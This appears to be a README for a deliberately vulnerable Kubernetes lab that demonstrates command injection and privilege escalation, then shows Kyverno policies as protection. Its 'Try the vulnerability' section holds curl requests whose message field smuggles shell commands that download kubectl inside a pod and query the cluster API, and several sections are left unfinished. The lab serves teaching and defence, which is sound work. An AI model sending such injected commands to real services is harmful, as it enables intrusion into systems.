# Vulnerable-web-stack-kube

This repository demonstrates how missconfigured services inside Kubernetes can lead to privilegies escalation.

## Usage


```bash
cd vulnerable-web-stack-kube
```

### Launch the cluster
  
```bash
kubectl apply -f ./k8s/resources
```

### Try the vulnerability

Open a shell in the client application and install kubectl

```bash
curl -X POST -H "Content-Type: application/json" -d '{"message":"hello; curl -LO https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl; chmod +x ./kubectl"}' http://server-service:3000/message
```bash
curl -X POST -H "Content-Type: application/json" -d '{"message":"hello; ./kubectl get pods"}' http://server-service:3000/message
```

We can see that the command is executed inside the pod and that we can reach the kube API

### Protect the cluster with kyverno

```bash
kubectl apply -f ./k8s/policies
```

Now ce can't execute command inside the pod

```bash



### Sign and build the docker images

Sign the images with your docker hub account

The server 

```bash
cd ./services/server
docker build -t <your-docker-hub-username>/vulnerable-web-stack-kube-server:latest .
docker trust sign <your-docker-hub-username>/vulnerable-web-stack-kube-server:latest
```
The client

```bash
cd ./services/client
docker build -t <your-docker-hub-username>/vulnerable-web-stack-kube-client:latest .
docker trust sign <your-docker-hub-username>/vulnerable-web-stack-kube-client:latest
```

## Protection

To ensure pods are running with least privileges and avoid escalation, we can use kyverno. 
Kyverno will //

Launch it with 

```bash

```

## Privilegies escalation
```bash
# Install the latest version of kubectl
curl -LO https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl
# Right to the binary
chmod +x ./kubectl
# Move the binary in your PATH
sudo mv ./kubectl /usr/local/bin/kubectl
```

### Licence

This project is licensed under the MIT License - see the LICENSE file for details. 

### Author

Developped in the ☁️ with 🔒 by [GridexX](https://github.com/GridexX)